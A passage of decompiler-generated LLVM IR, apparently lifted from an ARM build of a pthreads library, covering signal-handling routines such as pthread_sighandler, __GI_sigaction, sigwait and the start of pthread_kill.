  %v1_c2ec = call i32 @__pthread_find_self(i32 %v1_c2e4)
  br label %dec_label_pc_c2f0

dec_label_pc_c2f0:                                ; preds = %bb4, %dec_label_pc_c2ec
  %v0_c2f0 = phi i32 [ %v1_c2e4, %bb4 ], [ %v1_c2ec, %dec_label_pc_c2ec ]
  %v1_c2f0 = add i32 %v0_c2f0, -3
  ret i32 %v1_c2f0

; uselistorder directives
  uselistorder i32 %v1_c2e4, { 1, 0 }
  uselistorder label %dec_label_pc_c2f0, { 1, 0 }
}

define i32 @pthread_sighandler_rt(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c310 = load i32, i32* @r4, align 4
  store i32 %v3_c310, i32* %stack_var_-20, align 4
  %v16_c310 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v0_c320 = call i32 @_thread_self.1()
  %v1_c324 = add i32 %v0_c320, 88
  %v2_c324 = inttoptr i32 %v1_c324 to i8*
  %v3_c324 = load i8, i8* %v2_c324, align 1
  %v4_c324 = zext i8 %v3_c324 to i32
  store i32 %v4_c324, i32* %r3.global-to-local, align 4
  %v2_c328 = icmp eq i8 %v3_c324, 0
  store i1 %v2_c328, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_c320, i32* %r6.global-to-local, align 4
  br i1 %v2_c328, label %.thread6, label %bb

.thread6:                                         ; preds = %entry
  %v0_c33c3 = load i32, i32* %r7.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c33c = load i32, i32* %r7.global-to-local, align 4
  %v3_c340 = add i32 %v0_c320, 32
  %v4_c340 = inttoptr i32 %v3_c340 to i32*
  store i32 %v0_c33c, i32* %v4_c340, align 4
  %v1_c344 = load i32, i32* %r3.global-to-local, align 4
  %v2_c344 = trunc i32 %v1_c344 to i8
  %v3_c344 = load i32, i32* %r6.global-to-local, align 4
  %v4_c344 = add i32 %v3_c344, 88
  %v5_c344 = inttoptr i32 %v4_c344 to i8*
  store i8 %v2_c344, i8* %v5_c344, align 1
  %v0_c348.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c348.pr, label %bb..thread5_crit_edge, label %bb13

bb..thread5_crit_edge:                            ; preds = %bb
  %v0_c34c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread5

bb13:                                             ; preds = %bb
  %v3_c348 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_c348, i32* %r4.global-to-local, align 4
  ret i32 %v0_c33c

.thread5:                                         ; preds = %bb..thread5_crit_edge, %.thread6
  %v0_c34c = phi i32 [ %v0_c320, %.thread6 ], [ %v0_c34c.pre, %bb..thread5_crit_edge ]
  %v0_c33c47 = phi i32 [ %v0_c33c3, %.thread6 ], [ %v0_c33c, %bb..thread5_crit_edge ]
  %v1_c34c = add i32 %v0_c34c, 84
  %v2_c34c = inttoptr i32 %v1_c34c to i32*
  %v3_c34c = load i32, i32* %v2_c34c, align 4
  store i32 %v3_c34c, i32* %r4.global-to-local, align 4
  %v2_c350 = icmp eq i32 %v3_c34c, 0
  store i1 %v2_c350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c350, label %bb14, label %bb15

bb14:                                             ; preds = %.thread5
  store i32 %v16_c310, i32* %v2_c34c, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb14
  store i32 ptrtoint (i32* @global_var_2b060.304 to i32), i32* %r3.global-to-local, align 4
  %v1_c360 = load i32, i32* %r7.global-to-local, align 4
  %v4_c360 = mul i32 %v1_c360, 4
  %v5_c360 = add i32 %v4_c360, ptrtoint (i32* @global_var_2b060.304 to i32)
  %v6_c360 = inttoptr i32 %v5_c360 to i32*
  %v7_c360 = load i32, i32* %v6_c360, align 4
  call void @__pseudo_branch(i32 %v7_c360)
  %v0_c364 = load i32, i32* %r4.global-to-local, align 4
  %v2_c364 = icmp eq i32 %v0_c364, 0
  store i1 %v2_c364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c364, label %bb16, label %bb17

bb16:                                             ; preds = %bb15
  %v2_c368 = load i32, i32* %r6.global-to-local, align 4
  %v3_c368 = add i32 %v2_c368, 84
  %v4_c368 = inttoptr i32 %v3_c368 to i32*
  store i32 0, i32* %v4_c368, align 4
  br label %bb17

bb17:                                             ; preds = %bb15, %bb16
  %v2_c36c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c36c, i32* %r4.global-to-local, align 4
  ret i32 %v0_c33c47

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @pthread_sighandler(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v2_c378 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg4, i32* %sl.global-to-local, align 4
  %v0_c38c = call i32 @_thread_self.1()
  %v1_c390 = add i32 %v0_c38c, 88
  %v2_c390 = inttoptr i32 %v1_c390 to i8*
  %v3_c390 = load i8, i8* %v2_c390, align 1
  %v4_c390 = zext i8 %v3_c390 to i32
  store i32 %v4_c390, i32* %r3.global-to-local, align 4
  %v2_c394 = icmp eq i8 %v3_c390, 0
  store i1 %v2_c394, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_c38c, i32* @r5, align 4
  br i1 %v2_c394, label %.thread8, label %.thread3

.thread8:                                         ; preds = %entry
  store i32 %v2_c378, i32* @r0, align 4
  %v2_c3a41 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v2_c3a41, i32* @r1, align 4
  store i32 88, i32* @r2, align 4
  br label %dec_label_pc_c3b8

.thread3:                                         ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c378, i32* @r0, align 4
  %v2_c3a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v2_c3a4, i32* @r1, align 4
  store i32 88, i32* @r2, align 4
  %v1_c3ac = load i32, i32* %r6.global-to-local, align 4
  %v3_c3ac = add i32 %v0_c38c, 32
  %v4_c3ac = inttoptr i32 %v3_c3ac to i32*
  store i32 %v1_c3ac, i32* %v4_c3ac, align 4
  %v1_c3b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_c3b0 = trunc i32 %v1_c3b0 to i8
  %v3_c3b0 = load i32, i32* @r5, align 4
  %v4_c3b0 = add i32 %v3_c3b0, 88
  %v5_c3b0 = inttoptr i32 %v4_c3b0 to i8*
  store i8 %v2_c3b0, i8* %v5_c3b0, align 1
  %v0_c3b4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c3b4.pr.pr, label %.thread3.dec_label_pc_c3b8_crit_edge, label %bb20

.thread3.dec_label_pc_c3b8_crit_edge:             ; preds = %.thread3
  %v0_c3b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c3b8

dec_label_pc_c3b8:                                ; preds = %.thread3.dec_label_pc_c3b8_crit_edge, %.thread8
  %v0_c3b8 = phi i32 [ %v0_c38c, %.thread8 ], [ %v0_c3b8.pre, %.thread3.dec_label_pc_c3b8_crit_edge ]
  %v1_c3b8 = add i32 %v0_c3b8, 84
  %v2_c3b8 = inttoptr i32 %v1_c3b8 to i32*
  %v3_c3b8 = load i32, i32* %v2_c3b8, align 4
  store i32 %v3_c3b8, i32* @r4, align 4
  %v2_c3bc = icmp eq i32 %v3_c3b8, 0
  store i1 %v2_c3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c3bc, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_c3b8
  store i32 %v2_c378, i32* %v2_c3b8, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_c3b8, %bb
  %v0_c3c4 = call i32 @memcpy()
  %v0_c3c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_c3c8, i32* @r0, align 4
  %v0_c3d4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_c3d4, i32* %r3.global-to-local, align 4
  %v4_c3e0 = mul i32 %v0_c3c8, 4
  %v5_c3e0 = add i32 %v4_c3e0, ptrtoint (i32* @global_var_2b060.304 to i32)
  %v6_c3e0 = inttoptr i32 %v5_c3e0 to i32*
  %v7_c3e0 = load i32, i32* %v6_c3e0, align 4
  call void @__pseudo_branch(i32 %v7_c3e0)
  %v0_c3e4 = load i32, i32* @r4, align 4
  %v2_c3e4 = icmp eq i32 %v0_c3e4, 0
  store i1 %v2_c3e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c3e4, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  %v2_c3e8 = load i32, i32* @r5, align 4
  %v3_c3e8 = add i32 %v2_c3e8, 84
  %v4_c3e8 = inttoptr i32 %v3_c3e8 to i32*
  store i32 0, i32* %v4_c3e8, align 4
  br label %bb20

bb20:                                             ; preds = %.thread3, %bb18, %bb19
  %v23_c3f0 = load i32, i32* @r0, align 4
  ret i32 %v23_c3f0

; uselistorder directives
  uselistorder i32 %v2_c378, { 1, 2, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder label %bb20, { 2, 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-160 = alloca i32, align 4
  %v3_c3f8 = load i32, i32* @r4, align 4
  %v6_c3f8 = load i32, i32* @r5, align 4
  %v9_c3f8 = load i32, i32* @r6, align 4
  %v2_c400 = load i32, i32* @global_var_2a7a8.307, align 4
  %v0_c404 = load i32, i32* %r0.global-to-local, align 4
  %v9_c404 = icmp eq i32 %v0_c404, %v2_c400
  %v2_c408 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v0_c404, i32* @r4, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v9_c404, label %dec_label_pc_c4fc, label %dec_label_pc_c41c

dec_label_pc_c41c:                                ; preds = %entry
  %v2_c420 = load i32, i32* @global_var_2a7ac.224, align 4
  %v9_c424 = icmp eq i32 %v0_c404, %v2_c420
  br i1 %v9_c424, label %dec_label_pc_c4fc, label %dec_label_pc_c42c

dec_label_pc_c42c:                                ; preds = %dec_label_pc_c41c
  %v2_c430 = load i32, i32* @global_var_2a7b0.202, align 4
  %v9_c434 = icmp eq i32 %v0_c404, %v2_c430
  br i1 %v9_c434, label %dec_label_pc_c43c, label %dec_label_pc_c444

dec_label_pc_c43c:                                ; preds = %dec_label_pc_c42c
  %v5_c440 = icmp sgt i32 %v0_c404, 0
  br i1 %v5_c440, label %dec_label_pc_c4fc, label %dec_label_pc_c444

dec_label_pc_c444:                                ; preds = %dec_label_pc_c42c, %dec_label_pc_c43c
  %v2_c444 = icmp eq i32* %arg2, null
  br i1 %v2_c444, label %bb, label %dec_label_pc_c450

bb:                                               ; preds = %dec_label_pc_c444
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c4ac

dec_label_pc_c450:                                ; preds = %dec_label_pc_c444
  store i32 %v2_c408, i32* @r0, align 4
  store i32 140, i32* @r2, align 4
  %v0_c45c = call i32 @memcpy()
  store i32 %v0_c45c, i32* %r0.global-to-local, align 4
  %v0_c460 = load i32, i32* @r5, align 4
  %v1_c460 = inttoptr i32 %v0_c460 to i32*
  %v2_c460 = load i32, i32* %v1_c460, align 4
  %v2_c464 = icmp ne i32 %v2_c460, 0
  %v7_c464 = icmp eq i32 %v2_c460, 1
  %v2_c468 = xor i1 %v2_c464, true
  %v3_c468 = or i1 %v7_c464, %v2_c468
  br i1 %v3_c468, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_c450
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_c450, %bb28
  %v0_c478.pr11 = phi i32 [ %v2_c460, %dec_label_pc_c450 ], [ 0, %bb28 ]
  %v2_c46c = xor i1 %v7_c464, true
  %v3_c46c = and i1 %v2_c464, %v2_c46c
  br i1 %v3_c46c, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v0_c478.pr = phi i32 [ %v0_c478.pr11, %bb29 ], [ 1, %bb30 ]
  %v0_c470 = load i32, i32* @r4, align 4
  %tmp32 = icmp slt i32 %v0_c470, 1
  br i1 %tmp32, label %.thread1, label %bb33

.thread1:                                         ; preds = %bb31
  br label %dec_label_pc_c4a8

bb33:                                             ; preds = %bb31
  %v2_c478 = icmp eq i32 %v0_c478.pr, 0
  br i1 %v2_c478, label %dec_label_pc_c4a8, label %dec_label_pc_c480

dec_label_pc_c480:                                ; preds = %bb33
  %v8_c484 = icmp sgt i32 %v0_c470, 64
  br i1 %v8_c484, label %dec_label_pc_c4a8, label %dec_label_pc_c488

dec_label_pc_c488:                                ; preds = %dec_label_pc_c480
  %v1_c488 = add i32 %v0_c460, 132
  %v2_c488 = inttoptr i32 %v1_c488 to i32*
  %v3_c488 = load i32, i32* %v2_c488, align 4
  %v1_c48c = and i32 %v3_c488, 4
  %v2_c48c = icmp eq i32 %v1_c48c, 0
  %. = select i1 %v2_c48c, i32 ptrtoint (i32* @global_var_c374.313 to i32), i32 ptrtoint (i32* @global_var_c310.311 to i32)
  store i32 %v2_c408, i32* %r0.global-to-local, align 4
  store i32 %., i32* %stack_var_-160, align 4
  br label %dec_label_pc_c4ac

dec_label_pc_c4a8:                                ; preds = %.thread1, %dec_label_pc_c480, %bb33
  store i32 %v2_c408, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c4ac

dec_label_pc_c4ac:                                ; preds = %bb, %dec_label_pc_c488, %dec_label_pc_c4a8
  %v0_c4b4 = phi i32 [ %v0_c404, %bb ], [ %v0_c470, %dec_label_pc_c488 ], [ %v0_c470, %dec_label_pc_c4a8 ]
  %v0_c4ac = phi i32 [ 0, %bb ], [ %v2_c408, %dec_label_pc_c488 ], [ %v2_c408, %dec_label_pc_c4a8 ]
  %v0_c4b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_c4b4, i32* %r0.global-to-local, align 4
  %v3_c4b8 = inttoptr i32 %v0_c4ac to i32*
  %v4_c4b8 = call i32 @__libc_sigaction(i32 %v0_c4b4, i32* %v3_c4b8, i32 %v0_c4b0)
  store i32 %v4_c4b8, i32* %r0.global-to-local, align 4
  %v7_c4bc = icmp eq i32 %v4_c4b8, -1
  br i1 %v7_c4bc, label %dec_label_pc_c508, label %dec_label_pc_c4c4

dec_label_pc_c4c4:                                ; preds = %dec_label_pc_c4ac
  %v0_c4c4 = load i32, i32* @r4, align 4
  %v1_c4c4 = add i32 %v0_c4c4, -1
  %tmp37 = icmp ugt i32 %v1_c4c4, 63
  br i1 %tmp37, label %dec_label_pc_c504, label %dec_label_pc_c4d0

dec_label_pc_c4d0:                                ; preds = %dec_label_pc_c4c4
  %v0_c4d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_c4d0 = icmp eq i32 %v0_c4d0, 0
  br i1 %v2_c4d0, label %.thread9, label %bb36

bb36:                                             ; preds = %dec_label_pc_c4d0
  %v5_c4d8 = mul i32 %v0_c4c4, 4
  %v6_c4d8 = add i32 %v5_c4d8, ptrtoint (i32* @global_var_2b060.304 to i32)
  %v7_c4d8 = inttoptr i32 %v6_c4d8 to i32*
  %v8_c4d8 = load i32, i32* %v7_c4d8, align 4
  %v3_c4dc = inttoptr i32 %v0_c4d0 to i32*
  store i32 %v8_c4d8, i32* %v3_c4dc, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_c4d0, %bb36
  %v0_c4e0 = load i32, i32* @r5, align 4
  %v2_c4e0 = icmp eq i32 %v0_c4e0, 0
  br i1 %v2_c4e0, label %dec_label_pc_c504, label %dec_label_pc_c4e8

dec_label_pc_c4e8:                                ; preds = %.thread9
  %v1_c4e8 = inttoptr i32 %v0_c4e0 to i32*
  %v2_c4e8 = load i32, i32* %v1_c4e8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c4f4 = load i32, i32* @r4, align 4
  %v5_c4f4 = mul i32 %v2_c4f4, 4
  %v6_c4f4 = add i32 %v5_c4f4, ptrtoint (i32* @global_var_2b060.304 to i32)
  %v7_c4f4 = inttoptr i32 %v6_c4f4 to i32*
  store i32 %v2_c4e8, i32* %v7_c4f4, align 4
  %v17_c50c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c508

dec_label_pc_c4fc:                                ; preds = %dec_label_pc_c43c, %dec_label_pc_c41c, %entry
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c508

dec_label_pc_c504:                                ; preds = %.thread9, %dec_label_pc_c4c4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c508

dec_label_pc_c508:                                ; preds = %dec_label_pc_c4ac, %dec_label_pc_c4fc, %dec_label_pc_c4e8, %dec_label_pc_c504
  %v17_c50c = phi i32 [ %v4_c4b8, %dec_label_pc_c4ac ], [ 22, %dec_label_pc_c4fc ], [ %v17_c50c.pre, %dec_label_pc_c4e8 ], [ 0, %dec_label_pc_c504 ]
  store i32 %v3_c3f8, i32* @r4, align 4
  store i32 %v6_c3f8, i32* @r5, align 4
  store i32 %v9_c3f8, i32* @r6, align 4
  ret i32 %v17_c50c

; uselistorder directives
  uselistorder i32 %v4_c4b8, { 1, 0, 2 }
  uselistorder i32 %v0_c4b4, { 1, 0 }
  uselistorder i1 %v2_c464, { 1, 0 }
  uselistorder i32 %v2_c408, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 9, 7, 8, 2, 11, 10, 0, 1 }
  uselistorder label %dec_label_pc_c508, { 3, 1, 2, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_c4ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c4a8, { 1, 2, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_c444, { 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-504 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-508 = alloca i32, align 4
  %v2_c530 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %tmp, i32* %stack_var_-508, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_c53c = call i32 @_thread_self.1()
  store i32 %v2_c530, i32* @r0, align 4
  %v2_c54c = load i32, i32* @r2, align 4
  %v5_c54c = call i32 @sigfillset(i32 %v2_c530, i32 %tmp, i32 %v2_c54c, i32 %v0_c53c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_c530, i32* @r0, align 4
  %v1_c55c = call i32 @__GI_sigdelset(i32 %v2_c530)
  %v2_c5bc = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_c5ec

dec_label_pc_c568:                                ; preds = %dec_label_pc_c5ec
  %v2_c568 = call i32 @sigismember(i32 %v0_c5f4, i32 %storemerge)
  %v2_c56c = icmp eq i32 %v2_c568, 0
  br i1 %v2_c56c, label %dec_label_pc_c5e8, label %dec_label_pc_c574

dec_label_pc_c574:                                ; preds = %dec_label_pc_c568
  %v2_c578 = load i32, i32* @global_var_2a7a8.307, align 4
  %v0_c57c = load i32, i32* @r4, align 4
  %v9_c57c = icmp eq i32 %v0_c57c, %v2_c578
  br i1 %v9_c57c, label %dec_label_pc_c5e8, label %dec_label_pc_c584

dec_label_pc_c584:                                ; preds = %dec_label_pc_c574
  %v2_c588 = load i32, i32* @global_var_2a7ac.224, align 4
  %v9_c58c = icmp eq i32 %v0_c57c, %v2_c588
  br i1 %v9_c58c, label %dec_label_pc_c5e8, label %dec_label_pc_c594

dec_label_pc_c594:                                ; preds = %dec_label_pc_c584
  %v2_c598 = load i32, i32* @global_var_2a7b0.202, align 4
  %v9_c59c = icmp eq i32 %v0_c57c, %v2_c598
  store i32 %v2_c530, i32* @r0, align 4
  br i1 %v9_c59c, label %dec_label_pc_c5e8, label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c594
  %v1_c5ac = call i32 @__GI_sigdelset(i32 %v2_c530)
  %v1_c5b4 = load i32, i32* @r4, align 4
  %v4_c5b4 = mul i32 %v1_c5b4, 4
  %v5_c5b4 = add i32 %v4_c5b4, ptrtoint (i32* @global_var_2b060.304 to i32)
  %v6_c5b4 = inttoptr i32 %v5_c5b4 to i32*
  %v7_c5b4 = load i32, i32* %v6_c5b4, align 4
  store i32 %v2_c5bc, i32* @r0, align 4
  %v7_c5b4.cmp = icmp ugt i32 %v7_c5b4, 1
  br i1 %v7_c5b4.cmp, label %dec_label_pc_c5e8, label %dec_label_pc_c5c4

dec_label_pc_c5c4:                                ; preds = %dec_label_pc_c5ac
  store i32 ptrtoint (i32* @global_var_c290.320 to i32), i32* %stack_var_-284, align 4
  %v1_c5cc = call i32 @sigemptyset(i32 %v2_c5bc)
  %v0_c5d8 = load i32, i32* @r4, align 4
  %v4_c5e4 = call i32 @__GI_sigaction(i32 %v0_c5d8, i32* nonnull %stack_var_-284, i32 0)
  br label %dec_label_pc_c5e8

dec_label_pc_c5e8:                                ; preds = %dec_label_pc_c5ac, %dec_label_pc_c594, %dec_label_pc_c584, %dec_label_pc_c574, %dec_label_pc_c568, %dec_label_pc_c5c4
  %v0_c5e8 = load i32, i32* @r4, align 4
  %v1_c5e8 = add i32 %v0_c5e8, 1
  br label %dec_label_pc_c5ec

dec_label_pc_c5ec:                                ; preds = %entry, %dec_label_pc_c5e8
  %storemerge = phi i32 [ 1, %entry ], [ %v1_c5e8, %dec_label_pc_c5e8 ]
  store i32 %storemerge, i32* @r4, align 4
  %v0_c5f4 = load i32, i32* @r5, align 4
  store i32 %v0_c5f4, i32* @r0, align 4
  %v7_c5f8 = icmp sgt i32 %storemerge, 65
  br i1 %v7_c5f8, label %dec_label_pc_c5fc, label %dec_label_pc_c568

dec_label_pc_c5fc:                                ; preds = %dec_label_pc_c5ec
  store i32 1, i32* @r1, align 4
  %v3_c604 = call i32 @__sigsetjmp(i32* nonnull %stack_var_-504, i32 1)
  %v2_c608 = icmp eq i32 %v3_c604, 0
  br i1 %v2_c608, label %dec_label_pc_c610, label %dec_label_pc_c5fc.dec_label_pc_c658_crit_edge

dec_label_pc_c5fc.dec_label_pc_c658_crit_edge:    ; preds = %dec_label_pc_c5fc
  %.pre = add i32 %v0_c53c, 40
  %.pre1 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_c658

dec_label_pc_c610:                                ; preds = %dec_label_pc_c5fc
  %v2_c5fc = ptrtoint i32* %stack_var_-504 to i32
  %v1_c618 = add i32 %v0_c53c, 66
  %v2_c618 = inttoptr i32 %v1_c618 to i8*
  %v3_c618 = load i8, i8* %v2_c618, align 1
  %v2_c61c = icmp eq i8 %v3_c618, 0
  %v2_c624 = add i32 %v0_c53c, 40
  %v3_c624 = inttoptr i32 %v2_c624 to i32*
  store i32 %v2_c5fc, i32* %v3_c624, align 4
  br i1 %v2_c61c, label %dec_label_pc_c63c, label %dec_label_pc_c62c

dec_label_pc_c62c:                                ; preds = %dec_label_pc_c610
  %v1_c630 = add i32 %v0_c53c, 64
  %v2_c630 = inttoptr i32 %v1_c630 to i8*
  %v3_c630 = load i8, i8* %v2_c630, align 1
  %v2_c634 = icmp eq i8 %v3_c630, 0
  br i1 %v2_c634, label %dec_label_pc_c658, label %dec_label_pc_c63c

dec_label_pc_c63c:                                ; preds = %dec_label_pc_c62c, %dec_label_pc_c610
  store i32 %v0_c53c, i32* @r2, align 4
  %v2_c644 = add i32 %v0_c53c, 32
  %v3_c644 = inttoptr i32 %v2_c644 to i32*
  store i32 0, i32* %v3_c644, align 4
  %v2_c64c = load i32, i32* @r2, align 4
  %v3_c64c = add i32 %v2_c64c, 88
  %v4_c64c = inttoptr i32 %v3_c64c to i8*
  store i8 1, i8* %v4_c64c, align 1
  %v1_c654 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v2_c654 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_c654)
  br label %dec_label_pc_c658

dec_label_pc_c658:                                ; preds = %dec_label_pc_c5fc.dec_label_pc_c658_crit_edge, %dec_label_pc_c62c, %dec_label_pc_c63c
  %v3_c660.pre-phi = phi i32* [ %.pre1, %dec_label_pc_c5fc.dec_label_pc_c658_crit_edge ], [ %v3_c624, %dec_label_pc_c62c ], [ %v3_c624, %dec_label_pc_c63c ]
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %v3_c660.pre-phi, align 4
  %v0_c664 = call i32 @pthread_testcancel()
  %v2_c66c = load i32, i32* %stack_var_-508, align 4
  %v1_c670 = add i32 %v0_c53c, 32
  %v2_c670 = inttoptr i32 %v1_c670 to i32*
  %v3_c670 = load i32, i32* %v2_c670, align 4
  %v0_c674 = load i32, i32* @r4, align 4
  %v2_c678 = inttoptr i32 %v2_c66c to i32*
  store i32 %v3_c670, i32* %v2_c678, align 4
  ret i32 %v0_c674

; uselistorder directives
  uselistorder i32 %v0_c5f4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_c53c, { 3, 5, 4, 2, 1, 6, 0, 7 }
  uselistorder i32 %v2_c530, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32* %stack_var_-504, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2b060.304 to i32), { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @sigfillset, { 1, 0 }
  uselistorder i32 ()* @_thread_self.1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c658, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c5ec, { 1, 0 }
  uselistorder label %dec_label_pc_c5e8, { 5, 0, 1, 2, 3, 4 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c6a0 = urem i32 %arg1, 1024
  %v3_c6a4 = load i32, i32* @r4, align 4
  store i32 %v3_c6a4, i32* %stack_var_-20, align 4
  %v4_c6a8 = mul nuw nsw i32 %v3_c6a0, 16
  %v5_c6a8 = add i32 %v4_c6a8, ptrtoint (i32* @global_var_263c0.205 to i32)
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c6bc = call i32 @__pthread_lock(i32 %v5_c6a8, i32 0)
  %v1_c6c0 = add i32 %v4_c6a8, add (i32 ptrtoint (i32* @global_var_263c0.205 to i32), i32 8)
  %v2_c6c0 = inttoptr i32 %v1_c6c0 to i32*
  %v3_c6c0 = load i32, i32* %v2_c6c0, align 4
  %v2_c6c4 = icmp eq i32 %v3_c6c0, 0
  br i1 %v2_c6c4, label %dec_label_pc_c6e4, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %entry
  %v1_c6d0 = add i32 %v3_c6c0, 16
  %v2_c6d0 = inttoptr i32 %v1_c6d0 to i32*
  %v3_c6d0 = load i32, i32* %v2_c6d0, align 4
  %v1_c6d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c6d4 = sub i32 %v3_c6d0, %v1_c6d4
  store i32 %v2_c6d4, i32* %r6.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v3_c6d0, %v1_c6d4
  br i1 %v9_c6d4, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c6d0
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c6e4

bb:                                               ; preds = %dec_label_pc_c6d0
  %v2_c6dc = icmp eq i32 %v2_c6d4, 0
  br i1 %v2_c6dc, label %dec_label_pc_c6f0, label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %.thread, %bb, %entry
  %v1_c6e4 = call i32 @__pthread_unlock(i32 %v5_c6a8)
  %v2_c6ec = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c6ec, i32* %r4.global-to-local, align 4
  ret i32 3

dec_label_pc_c6f0:                                ; preds = %bb
  %v1_c6f0 = add i32 %v3_c6c0, 20
  %v2_c6f0 = inttoptr i32 %v1_c6f0 to i32*
  %v3_c6f0 = load i32, i32* %v2_c6f0, align 4
  store i32 %v3_c6f0, i32* @r4, align 4
